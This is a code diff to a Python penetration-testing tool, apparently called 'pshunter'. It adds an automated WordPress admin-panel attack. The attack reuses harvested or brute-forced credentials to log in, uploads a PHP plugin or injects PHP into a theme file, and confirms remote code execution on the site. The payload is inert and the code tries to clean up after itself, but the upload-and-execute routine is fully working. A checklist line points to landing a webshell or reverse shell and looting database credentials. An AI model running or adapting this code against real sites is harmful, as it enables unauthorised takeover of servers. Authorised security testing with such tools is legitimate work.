@@ -2065,6 +2065,16 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"CMS detected: {cmsm.group(1)}"[:140]}
         return None
 
+    # 2z) admin-rce: authenticated admin panel → code execution
+    if sid == "admin-rce":
+        hits = re.findall(r"✗ ADMIN-RCE (\S+)", output)
+        if hits:
+            meth = re.search(r"✗ ADMIN-RCE \S+\s+\(([^)]+)\)", output)
+            mt = f" ({meth.group(1)})" if meth else ""
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"Authenticated admin RCE: {hits[0]}{mt}"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2704,7 +2714,8 @@ _EXPLOIT_STEPS = {
         # ── known-app exploitation & foothold ──
         ("CMS-specific scan (wpscan / droopescan) → vulnerable plugins, themes, versions",
          "cms-scan"),
-        "Admin panel → RCE: upload plugin/theme, edit a template, or config code-exec",
+        ("Admin panel → RCE: upload plugin/theme, edit a template, or config code-exec",
+         "admin-rce"),
         "Land a webshell / reverse shell; stabilise; loot DB creds & config for reuse",
     ],
     "smb": [
@@ -7140,7 +7151,8 @@ def _gather_id_endpoints(ip: str, port: int, proto: str) -> list:
 
 def _parse_valid_creds(ip: str, port: int, proto: str) -> list:
     """(hostval, path, kind, user, pass) valid credentials harvested earlier by default-creds
-    (its output lines look like `! user:pass @ /path (form) [host]`)."""
+    (`! user:pass @ /path (form) [host]`) or login-brute (`✗ CRACKED user:pass @ /path (form)`
+    under a `[host]` section)."""
     out = []
     for sid, output in fetch_scripts(ip, port, proto):
         if sid == "default-creds":
@@ -7148,6 +7160,18 @@ def _parse_valid_creds(ip: str, port: int, proto: str) -> list:
                     r"! (\S+):(\S+) @ (\S+) \((Basic|form)\) \[([^\]]+)\]", output or ""):
                 pw = "" if m.group(2) == "<blank>" else m.group(2)
                 out.append((m.group(5), m.group(3), m.group(4), m.group(1), pw))
+        elif sid == "login-brute":
+            host = ip
+            for ln in (output or "").splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mc = re.match(r"\s*✗ CRACKED (\S+):(\S+) @ (\S+) \(([^)]+)\)", ln)
+                if mc:
+                    pw = "" if mc.group(2) == "<blank>" else mc.group(2)
+                    kind = "Basic" if "basic" in mc.group(4).lower() else "form"
+                    out.append((host, mc.group(3), kind, mc.group(1), pw))
     return out
 
 
@@ -7606,6 +7630,211 @@ def _tool_cms_scan(ip: str, port: int, proto: str) -> str:
     return "\n".join(lines)
 
 
+# ── HTTP step 25: Admin panel → RCE (WordPress; creds-gated, inert, reversible) ──
+_ADMINRCE_DEADLINE = 200
+_ADMINRCE_REQ_TIMEOUT = 12
+
+
+def _wp_nonce(html: str, field: str = "_wpnonce") -> "str | None":
+    """Pull a WordPress nonce value out of a hidden input, either attribute order."""
+    m = (re.search(rf'(?:id|name)="{field}"[^>]*value="([^"]+)"', html or "")
+         or re.search(rf'value="([^"]+)"[^>]*(?:id|name)="{field}"', html or ""))
+    return m.group(1) if m else None
+
+
+def _tool_admin_rce(ip: str, port: int, proto: str) -> str:
+    """HTTP step-25 tool: turn valid admin credentials into code execution through a WordPress
+    admin panel — upload a tiny plugin (primary) or edit an inactive theme file (fallback). The
+    payload is INERT (echoes a unique marker × arithmetic, no live shell); success is proven by
+    fetching the dropped file back. It is REVERSIBLE: the plugin is deleted / the theme file is
+    restored, and anything left behind is listed for manual removal. Gated on credentials found
+    by default-creds / login-brute — it will not run blind. Authorised targets only: this writes
+    executable code to the target. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import io
+    import zipfile
+    import urllib.parse
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+    base = f"{scheme}://{ip}:{port}/"
+
+    def _req(hostval, method, path, body=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_ADMINRCE_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_ADMINRCE_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            data = resp.read(300000).decode("utf-8", "replace")
+            return (resp.status, data, resp.headers.get_all("Set-Cookie") or [],
+                    resp.getheader("Location"))
+        except Exception:                                     # noqa: BLE001
+            return None, None, [], None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    def _merge(jar, setc):
+        for c in setc:
+            nv = c.split(";", 1)[0].strip()
+            if "=" in nv:
+                jar[nv.split("=", 1)[0]] = nv
+        return "; ".join(jar.values())
+
+    def _wp_login(hostval, u, p):
+        jar = {}
+        _s, _b, setc, _l = _req(hostval, "GET", "/wp-login.php")
+        cookie = _merge(jar, setc)
+        body = urllib.parse.urlencode({"log": u, "pwd": p, "wp-submit": "Log In",
+                                       "redirect_to": base + "wp-admin/", "testcookie": "1"})
+        ex = {"Content-Type": "application/x-www-form-urlencoded",
+              "Cookie": (cookie + "; " if cookie else "") + "wordpress_test_cookie=WP+Cookie+check"}
+        _s, _b, setc, _l = _req(hostval, "POST", "/wp-login.php", body=body, extra=ex)
+        cookie = _merge(jar, setc)
+        if "wordpress_logged_in" in cookie:
+            return cookie
+        st, b, setc, _l = _req(hostval, "GET", "/wp-admin/", extra={"Cookie": cookie})
+        if st == 200 and b and "dashboard" in b.lower():
+            return _merge(jar, setc)
+        return None
+
+    # ── confirm WordPress ──
+    blob = ""
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid in ("http-fingerprint", "http-headers", "http-source", "dir-brute"):
+            blob += " " + (output or "")
+    st, hb, _sc, _l = _req(ip, "GET", "/")
+    if st is None:
+        raise RuntimeError(f"{base} unreachable — cannot attempt admin RCE")
+    blob += " " + (hb[:20000] if hb else "")
+    cms, _ver = _detect_cms(blob)
+    if cms != "wordpress":
+        return (f"{base} admin-panel RCE\n"
+                f"CMS is {cms or 'unknown'} — only WordPress is automated here; "
+                "exploit the admin panel manually (upload plugin/theme, edit a template)")
+
+    # ── need working admin creds ──
+    creds = [c for c in _parse_valid_creds(ip, port, proto) if c[2] == "form"]
+    if not creds:
+        return (f"{base} admin-panel RCE\n"
+                "no admin credentials available — run default-creds / login-brute first")
+
+    session = None
+    for chost, _cpath, _kind, u, p in creds:
+        cookie = _wp_login(chost, u, p)
+        if cookie:
+            session = (chost, cookie, u, p)
+            break
+    if not session:
+        return (f"{base} admin-panel RCE\n"
+                "found credentials but none logged into wp-admin (form may differ) — verify manually")
+
+    host, cookie, user, _pw = session
+    token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
+    slug = "psh" + token
+    mark = "PSHADM" + token
+    a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+    product = str(a * b)
+    payload = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>"
+    rce, artifacts, tried = [], [], []
+    ck = {"Cookie": cookie}
+
+    # ── primary: upload a tiny plugin ──
+    st, b_html, _sc, _l = _req(host, "GET", "/wp-admin/plugin-install.php?tab=upload", extra=ck)
+    nonce = _wp_nonce(b_html or "")
+    if nonce:
+        tried.append("plugin upload")
+        php = (f"<?php\n/*\nPlugin Name: {slug}\nVersion: 0.0\n*/\n"
+               f"echo '{mark}',{a}*{b},'{mark}';\n")
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+            z.writestr(f"{slug}/{slug}.php", php)
+        body, boundary = _multipart({"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
+                                    "pluginzip", f"{slug}.zip", "application/zip", buf.getvalue())
+        _req(host, "POST", "/wp-admin/update.php?action=upload-plugin", body=body,
+             extra={"Cookie": cookie, "Content-Type": f"multipart/form-data; boundary={boundary}"})
+        vpath = f"/wp-content/plugins/{slug}/{slug}.php"
+        vst, vbody, _sc, _l = _req(host, "GET", vpath)
+        if vst is not None and vbody and f"{mark}{product}{mark}" in vbody:
+            rce.append(f"  ✗ ADMIN-RCE {scheme}://{host}:{port}{vpath}  (wordpress: plugin upload)")
+            # best-effort cleanup: bulk-delete the plugin
+            gs, gb, _s, _l = _req(host, "GET", "/wp-admin/plugins.php", extra=ck)
+            dnonce = _wp_nonce(gb or "", "_wpnonce")
+            deleted = False
+            if dnonce:
+                dbody = urllib.parse.urlencode({"action": "delete-selected",
+                                                "checked[]": f"{slug}/{slug}.php",
+                                                "_wpnonce": dnonce, "verify-delete": "1"})
+                _req(host, "POST", "/wp-admin/plugins.php", body=dbody,
+                     extra={"Cookie": cookie,
+                            "Content-Type": "application/x-www-form-urlencoded"})
+                cst, _cb, _s, _l = _req(host, "GET", vpath)
+                deleted = (cst == 404)
+            if not deleted:
+                artifacts.append(f"{host}{vpath}  (plugin '{slug}' — delete in wp-admin/plugins)")
+
+    # ── fallback: edit an inactive theme's file ──
+    if not rce:
+        st, te, _sc, _l = _req(host, "GET", "/wp-admin/theme-editor.php", extra=ck)
+        if st == 200 and te:
+            tried.append("theme editor")
+            tnonce = _wp_nonce(te, "_wpnonce")
+            theme = re.search(r'name="theme"[^>]*value="([^"]+)"', te) or \
+                re.search(r'theme=([^"&]+)&(?:amp;)?file=', te)
+            phpfile = re.search(r'file=([^"&]+\.php)', te)
+            m_orig = re.search(r'<textarea[^>]*id="newcontent"[^>]*>(.*?)</textarea>', te, re.S)
+            if tnonce and theme and phpfile:
+                tval, fval = theme.group(1), phpfile.group(1)
+                orig = m_orig.group(1) if m_orig else ""
+                new = (orig or "") + "\n" + payload
+                post = urllib.parse.urlencode({"_wpnonce": tnonce, "newcontent": new,
+                                               "action": "update", "file": fval, "theme": tval,
+                                               "submit": "Update File"})
+                est, _eb, _s, _l = _req(host, "POST", "/wp-admin/theme-editor.php", body=post,
+                                        extra={"Cookie": cookie,
+                                               "Content-Type": "application/x-www-form-urlencoded"})
+                vpath = f"/wp-content/themes/{tval}/{fval}"
+                vst, vbody, _sc, _l = _req(host, "GET", vpath)
+                if vst is not None and vbody and f"{mark}{product}{mark}" in vbody:
+                    rce.append(f"  ✗ ADMIN-RCE {scheme}://{host}:{port}{vpath}  "
+                               f"(wordpress: theme edit {fval})")
+                if est in (200, 302):                        # we wrote → always restore the original
+                    restore = urllib.parse.urlencode({"_wpnonce": tnonce, "newcontent": orig,
+                                                       "action": "update", "file": fval,
+                                                       "theme": tval, "submit": "Update File"})
+                    _req(host, "POST", "/wp-admin/theme-editor.php", body=restore,
+                         extra={"Cookie": cookie,
+                                "Content-Type": "application/x-www-form-urlencoded"})
+                    rst, rb, _s, _l = _req(host, "GET", vpath)
+                    if rst is not None and rb and f"{mark}{product}{mark}" in rb:
+                        artifacts.append(f"{host}{vpath}  (theme file — restore failed, revert manually)")
+
+    lines = [f"{base} admin-panel RCE (WordPress)",
+             f"logged in as {user} · tried: {', '.join(tried) or 'none'} · RCE {len(rce)}"]
+    if rce:
+        lines.append("\nAUTHENTICATED ADMIN → RCE:")
+        lines += rce
+    if artifacts:
+        lines.append("\nartifacts to remove:")
+        lines += [f"  {x}" for x in artifacts]
+    if not rce:
+        lines.append("\nno admin→RCE path succeeded (nonce/permissions?) — try manually")
+    return "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("curl -sI (HTTP headers)", _tool_http_headers),
@@ -7632,6 +7861,7 @@ _STEP_TOOLS = {
     "xxe-ssrf": ("XXE & SSRF (stdlib, read-only) → metadata + file-read + OOB", _tool_xxe_ssrf),
     "idor-bac": ("IDOR / broken access control (stdlib, read-only, creds-aware)", _tool_idor_bac),
     "cms-scan": ("CMS scan → wpscan/droopescan + stdlib fallback (plugins/themes/users)", _tool_cms_scan),
+    "admin-rce": ("admin panel → RCE (WordPress, creds-gated, inert, reversible)", _tool_admin_rce),
 }
 
 def _mins(seconds: int) -> str:
@@ -7672,6 +7902,7 @@ _STEP_TOOL_RUNS = {
     "xxe-ssrf":         ("Python", f"{_mins(_XXES_DEADLINE)} min"),
     "idor-bac":         ("Python", f"{_mins(_IDOR_DEADLINE)} min"),
     "cms-scan":         ("Python + wpscan/droopescan", f"{_mins(_CMS_DEADLINE)} min"),
+    "admin-rce":        ("Python", f"{_mins(_ADMINRCE_DEADLINE)} min"),
 }
 
 
